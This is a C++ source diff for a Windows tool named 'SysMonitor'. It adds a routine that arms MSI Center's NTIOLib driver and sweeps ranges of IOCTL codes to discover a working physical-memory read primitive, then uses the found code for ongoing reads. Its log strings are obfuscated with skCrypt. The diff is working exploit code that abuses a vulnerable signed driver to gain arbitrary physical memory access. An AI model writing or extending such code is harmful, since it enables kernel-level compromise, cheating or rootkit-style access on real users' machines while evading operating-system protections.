@@ -406,12 +406,27 @@ public:
             }
         }
 
+        // Read-shape scan matched no known combo -- either the wire
+        // shape is stranger than our 4 candidates OR the read IOCTL
+        // number itself is elsewhere in this build's dispatch table.
+        // ReadIoctlSweep casts the wide net: probes 6xxx/Axxx/2xxx/60Cx
+        // ranges with the standard 16-byte req and reports any code
+        // whose response distinguishes a real handler (ok=1 / err=87 /
+        // err=24) from a dead case (err=6) or an unmapped entry (err=1).
+        if (!ok) {
+            printf(skCrypt("[SysMonitor] read-shape scan failed -- running broad IOCTL sweep\n"));
+            if (ReadIoctlSweep(m_hDevice)) {
+                probe = 0;
+                ok = NtioReadOnce(0x1000, 4, 1, &probe, sizeof(probe));
+            }
+        }
+
         // Arm-shape fallback: the 24-candidate ARM enumeration. Only
         // meaningful when the handle survives — ProbeGuard above ensures
         // it does. ArmScan reopens the handle itself as a defense in
         // depth if something else closed it in the meantime.
         if (!ok) {
-            printf(skCrypt("[SysMonitor] read-scan failed -- running empirical arm-scan\n"));
+            printf(skCrypt("[SysMonitor] read-sweep failed -- running empirical arm-scan\n"));
             if (ArmScan(m_hDevice)) {
                 // ArmScan validated with the canonical shape internally,
                 // so reset the hot path to it.
@@ -430,10 +445,14 @@ public:
             m_hDevice = INVALID_HANDLE_VALUE;
             return false;
         }
-        printf(skCrypt("[SysMonitor] NTIOLib probe OK  PA=0x1000 dword -> 0x%08X  (ioctl=0x%08X shape=%u)\n"),
-               (unsigned)probe,
-               (unsigned)kReadIoctls[m_readIoctlIdx.load(std::memory_order_acquire) & 1],
-               (unsigned)m_readShapeIdx.load(std::memory_order_acquire));
+        {
+            uint32_t override_code = m_readIoctlOverride.load(std::memory_order_acquire);
+            uint32_t active = override_code ? override_code
+                                            : kReadIoctls[m_readIoctlIdx.load(std::memory_order_acquire) & 1];
+            printf(skCrypt("[SysMonitor] NTIOLib probe OK  PA=0x1000 dword -> 0x%08X  (ioctl=0x%08X shape=%u)\n"),
+                   (unsigned)probe, (unsigned)active,
+                   (unsigned)m_readShapeIdx.load(std::memory_order_acquire));
+        }
         return true;
     }
 
@@ -1461,6 +1480,119 @@ private:
         return false;
     }
 
+    // Broad IOCTL-code sweep. Given ARM works on 0xC350214C, VERSION works
+    // on 0xC3502004, but 0xC3506104 uniformly returns STATUS_INVALID_HANDLE
+    // regardless of input shape, this build routes physical-memory read
+    // through a code we haven't identified. Sweep the plausible ranges
+    // with a standard 16-byte NtioReadReq at PA 0x1000 and classify:
+    //   ok=1  returned=size   → REAL READ PRIMITIVE (latch and return)
+    //   err=87 / err=24       → real handler, wrong request shape
+    //   err=6                 → dead case (returns STATUS_INVALID_HANDLE)
+    //   err=1                 → not in dispatch table
+    // Prints per-hit lines for the interesting classes plus a summary
+    // count, so operator can pattern-match against public NTIOLib RE.
+    bool ReadIoctlSweep(HANDLE h) {
+        if (h == INVALID_HANDLE_VALUE) {
+            printf(skCrypt("[SysMonitor] read-sweep: handle invalid, skipping\n"));
+            return false;
+        }
+
+        // Refresh arm state on this handle before sweeping — some drivers
+        // gate later reads on a per-handle arm token; the sweep needs
+        // that token active for real handlers to accept our probes.
+        {
+            uint32_t magic = NTIO_ARM_MAGIC;
+            DWORD ret = 0;
+            SetLastError(0);
+            DeviceIoControl(h, IOCTL_NTIO_ARM, &magic, sizeof(magic),
+                            &magic, sizeof(magic), &ret, nullptr);
+        }
+
+        struct Range { uint32_t lo; uint32_t hi; const char* tag; };
+        // Ranges chosen from the header's IOCTL surface table. The read
+        // family is documented at 0xC35061xx, write at 0xC350A1xx, MSR at
+        // 0xC35020xx. Sweep each family plus their neighbors — a build
+        // that renamed 6104→ something in the same neighborhood will show.
+        Range ranges[] = {
+            { 0xC3506000u, 0xC3506FFFu, "6xxx-read-family" },
+            { 0xC350A000u, 0xC350A2FFu, "Axxx-write-family" },
+            { 0xC3502000u, 0xC35023FFu, "2xxx-msr-family" },
+            { 0xC35060C0u, 0xC35060FFu, "60Cx-port-family" },
+        };
+
+        int  total  = 0;
+        int  nErr1 = 0, nErr6 = 0, nErr87 = 0, nErr24 = 0, nOk = 0, nOther = 0;
+        int  hitsPrinted = 0;
+        uint32_t foundCode = 0;
+
+        for (auto& r : ranges) {
+            printf(skCrypt("[SysMonitor] read-sweep range [%s] 0x%08X..0x%08X (step 4)\n"),
+                   r.tag, r.lo, r.hi);
+            for (uint32_t code = r.lo; code <= r.hi; code += 4) {
+                total++;
+                uint8_t req[32] = {};
+                size_t inBytes = BuildReadRequestBytes(
+                    NtioReadShape::STD_16, 0x1000, 4, 1, req);
+                uint32_t out = 0;
+                DWORD returned = 0;
+                SetLastError(0);
+                BOOL ok = DeviceIoControl(h, code,
+                                          req, (DWORD)inBytes,
+                                          &out, sizeof(out),
+                                          &returned, nullptr);
+                DWORD err = GetLastError();
+
+                if (ok != FALSE && returned == sizeof(out)) {
+                    printf(skCrypt("[SysMonitor] read-sweep HIT: ioctl=0x%08X ok=1 returned=%lu value=0x%08X\n"),
+                           (unsigned)code, returned, (unsigned)out);
+                    if (!foundCode) foundCode = code;
+                    nOk++;
+                    continue;
+                }
+                switch (err) {
+                case 1:  nErr1++;  break;
+                case 6:  nErr6++;  break;
+                case 87:
+                    nErr87++;
+                    if (hitsPrinted < 16) {
+                        printf(skCrypt("[SysMonitor] read-sweep [ioctl=0x%08X]: err=87 (real handler, wrong shape)\n"),
+                               (unsigned)code);
+                        hitsPrinted++;
+                    }
+                    break;
+                case 24:
+                    nErr24++;
+                    if (hitsPrinted < 16) {
+                        printf(skCrypt("[SysMonitor] read-sweep [ioctl=0x%08X]: err=24 (real handler, wrong buffer size)\n"),
+                               (unsigned)code);
+                        hitsPrinted++;
+                    }
+                    break;
+                default:
+                    nOther++;
+                    if (hitsPrinted < 8) {
+                        printf(skCrypt("[SysMonitor] read-sweep [ioctl=0x%08X]: err=%lu returned=%lu\n"),
+                               (unsigned)code, err, returned);
+                        hitsPrinted++;
+                    }
+                    break;
+                }
+            }
+        }
+
+        printf(skCrypt("[SysMonitor] read-sweep summary: probed=%d err1=%d err6=%d err87=%d err24=%d ok=%d other=%d\n"),
+               total, nErr1, nErr6, nErr87, nErr24, nOk, nOther);
+
+        if (foundCode) {
+            m_readIoctlOverride.store(foundCode, std::memory_order_release);
+            m_readShapeIdx.store((uint8_t)NtioReadShape::STD_16, std::memory_order_release);
+            printf(skCrypt("[SysMonitor] read-sweep FOUND read primitive at 0x%08X — latching for hot path\n"),
+                   (unsigned)foundCode);
+            return true;
+        }
+        return false;
+    }
+
     // Retry wrapper called from Open. Some NTIOLib builds initialize their
     // dispatch state a few ticks after DriverEntry returns; a rapid CreateFile
     // → ARM sequence right after service start can race that init and get
@@ -1557,7 +1689,8 @@ private:
         if (ioctlIdx >= 2) ioctlIdx = 0;
         size_t inBytes = BuildReadRequestBytes(
             (NtioReadShape)shapeIdx, physAddr, unit_size, count, reqBuf);
-        uint32_t code = kReadIoctls[ioctlIdx];
+        uint32_t codeOverride = m_readIoctlOverride.load(std::memory_order_acquire);
+        uint32_t code = codeOverride ? codeOverride : kReadIoctls[ioctlIdx];
 
         DWORD returned = 0;
         BOOL  ok = DeviceIoControl(hUse, code,
@@ -2132,4 +2265,13 @@ private:
     static constexpr uint32_t kReadIoctls[2] = { 0xC3506104u, 0xC3506144u };
     std::atomic<uint8_t>  m_readIoctlIdx       {0};
     std::atomic<uint8_t>  m_readShapeIdx       {0};
+
+    // Set by ReadIoctlSweep when it finds an IOCTL code that returns
+    // ok=1 with the expected byte count for a physical-read probe. Non-
+    // zero overrides kReadIoctls[m_readIoctlIdx] on the hot path so the
+    // actual code the sweep discovered gets used for real reads. The
+    // header's static-analysis-derived kReadIoctls table was for a
+    // different build; live-fire on this MSI Center 2.0.35.0 image
+    // shows 0xC3506104 returns STATUS_INVALID_HANDLE uniformly.
+    std::atomic<uint32_t> m_readIoctlOverride  {0};
 };
